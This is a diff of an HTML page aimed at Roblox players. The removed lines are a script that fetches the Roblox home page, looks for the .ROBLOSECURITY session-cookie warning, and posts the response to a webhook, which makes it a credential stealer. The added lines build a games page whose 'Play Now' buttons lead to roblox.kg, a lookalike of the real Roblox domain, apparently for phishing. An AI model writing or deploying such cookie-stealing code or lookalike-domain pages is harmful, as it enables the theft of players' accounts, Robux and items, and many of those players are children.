@@ -3,70 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Search and Send</title>
+    <title>Roblox Games Info</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .tabs {
+            display: flex;
+            justify-content: center;
+            background-color: #333;
+        }
+        .tabs button {
+            background-color: #333;
+            color: white;
+            padding: 14px 20px;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .tabs button:hover {
+            background-color: #111;
+        }
+        .tab-content {
+            display: none;
+            padding: 20px;
+            text-align: center;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        .game-icon {
+            width: 100px;
+            height: 100px;
+        }
+        .play-button {
+            background-color: #28a745;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            margin-top: 20px;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .play-button:hover {
+            background-color: #218838;
+        }
+    </style>
 </head>
 <body>
-    <button id="searchButton">Search and Send</button>
+
+    <div class="tabs">
+        <button onclick="showTab('adopt-me')">Adopt Me</button>
+        <button onclick="showTab('blox-fruits')">Blox Fruits</button>
+        <button onclick="showTab('da-hood')">Da Hood</button>
+    </div>
+
+    <div id="adopt-me" class="tab-content">
+        <img src="https://example.com/adopt-me-icon.png" alt="Adopt Me Icon" class="game-icon">
+        <h2>Adopt Me</h2>
+        <p>Adopt Me is a massively multiplayer online game on the gaming platform Roblox. The game features a variety of virtual pets, a customizable home, and various activities to enjoy with friends.</p>
+        <a href="https://www.roblox.kg/games/920587237/SUMMER-Adopt-Me?privateServerLinkCode=21466219774961862876923121752949" class="play-button">Play Now</a>
+    </div>
+
+    <div id="blox-fruits" class="tab-content">
+        <img src="https://tr.rbxcdn.com/5087cd04a0ddd0208b4d3aabd558afa2/768/432/Image/Webp" alt="Blox Fruits Icon" class="game-icon">
+        <h2>Blox Fruits</h2>
+        <p>Blox Fruits is a game where you can become a powerful fighter or fruit user as you train to become the strongest player in the world.</p>
+        <a href="https://www.roblox.kg/games/2753915549/Blox-Fruits?privateServerLinkCode=86526315434340671192844124685271" class="play-button">Play Now</a>
+    </div>
+
+    <div id="da-hood" class="tab-content">
+        <img src="https://tr.rbxcdn.com/59573e55b7a76db1b8f15ca06007b8e4/768/432/Image/Webp" alt="Da Hood Icon" class="game-icon">
+        <h2>Da Hood</h2>
+        <p>Da Hood is a game on Roblox where you can explore a city, engage in combat, and participate in various activities such as robbing stores and role-playing as different characters.</p>
+        <a href="https://www.roblox.kg/games/2788229376/Da-Hood-UPDATE?privateServerLinkCode=02068085631340796062776777402388" class="play-button">Play Now</a>
+    </div>
 
     <script>
-        document.getElementById("searchButton").addEventListener("click", function() {
-            // Open Roblox home page in a new tab
-            window.open("https://roblox.com/home", "_blank");
+        function showTab(tabId) {
+            const contents = document.querySelectorAll('.tab-content');
+            contents.forEach(content => content.classList.remove('active'));
 
-            // Start the search process in the current tab
-            setTimeout(searchWebsite, 5000); // Delay to give time for the new tab to open
-        });
-
-        function searchWebsite() {
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", "https://roblox.com/home", true);
-            xhr.onload = function() {
-                if (xhr.status === 200) {
-                    var result = xhr.responseText;
-
-                    // Define the search strings
-                    var searchStrings = [
-                        "|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|",
-                        ".ROBLOXSECURITY"
-                    ];
-
-                    // Check if the response contains any of the search strings
-                    var found = searchStrings.some(function(str) {
-                        return result.includes(str);
-                    });
-
-                    if (found) {
-                        sendToWebhook(result);
-                    } else {
-                        console.log("No matches found");
-                    }
-                } else {
-                    console.error("Error: " + xhr.status);
-                }
-            };
-            xhr.onerror = function() {
-                console.error("Request failed");
-            };
-            xhr.send();
-        }
-
-        function sendToWebhook(data) {
-            var webhookUrl = "YOUR_WEBHOOK_URL";
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", webhookUrl, true);
-            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-            xhr.onload = function() {
-                if (xhr.status === 200) {
-                    console.log("Successfully sent to webhook");
-                } else {
-                    console.error("Error sending to webhook: " + xhr.status);
-                }
-            };
-            xhr.onerror = function() {
-                console.error("Webhook request failed");
-            };
-            xhr.send(JSON.stringify({ content: data }));
+            document.getElementById(tabId).classList.add('active');
         }
     </script>
+
 </body>
 </html>
